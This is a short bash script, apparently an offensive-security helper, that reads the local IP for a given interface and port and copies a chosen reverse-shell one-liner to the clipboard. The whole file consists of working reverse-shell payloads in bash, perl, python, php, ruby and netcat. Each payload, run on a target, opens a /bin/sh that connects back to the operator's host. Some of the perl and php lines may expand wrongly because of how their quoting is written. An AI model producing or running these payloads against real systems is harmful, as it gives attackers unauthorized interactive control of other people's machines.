#!/bin/bash

red="\e[31m"
green="\e[32m"
norm="\e[0m"

msg="$green[+]$norm Revshell copied to clipboard!"

if [ $# -lt 2 ]; then
  echo -e "Usage: $0 <INTERFACE> <PORT> <shell>"
  exit
fi

command -v xclip >/dev/null 2>&1 || { echo >&2 -e "$red[-]$norm xclip is required but is not installed. Aborting."; exit 1; }

INT=$1
PORT=$2
IP=$(ifconfig $INT | grep inet | head -n1 | awk '{ print $2 }')
shell=$3

if [ $# -eq 2 ]; then
  echo -e "Reverse Shells:"
  echo -e "  1. bash"
  echo -e "  2. perl"
  echo -e "  3. python"
  echo -e "  4. php"
  echo -e "  5. ruby"
  echo -e "  6. nc-1"
  echo -e "  7. nc-2"
  echo -e -n "Enter the no. of the shell: "
  read shellno
fi

if [[ $shell == "bash" ]] || [[ $shellno == "1" ]]; then
  echo -e $msg
  echo -e "bash -i >& /dev/tcp/$IP/$PORT 0>&1" | tee /dev/tty | xclip -sel clip

elif [[ $shell == "perl" ]] || [[ $shellno == "2" ]]; then
  echo -e "perl -e 'use Socket;$i=\"$IP\";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" | tee /dev/tty | xclip -sel clip

elif [[ $shell == "python" ]] || [[ $shellno == "3" ]]; then
  echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" | tee /dev/tty | xclip -sel clip

elif [[ $shell == "php" ]] || [[ $shellno == "4" ]]; then
  echo -e "php -r '$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | tee /dev/tty | xclip -sel clip

elif [[ $shell == "ruby" ]] || [[ $shellno == "5" ]]; then
  echo -e "ruby -rsocket -e 'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" | tee /dev/tty | xclip -sel clip

elif [[ $shell == "nc-1" ]] || [[ $shellno == "6" ]]; then
  echo -e "nc -e /bin/sh $IP $PORT" | tee /dev/tty | xclip -sel clip

elif [[ $shell == "nc-2" ]] || [[ $shellno == "7" ]]; then
  echo -e "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f" | tee /dev/tty | xclip -sel clip

else
  echo -e "$red[-]$norm No reverse shell found for $3 :("
fi
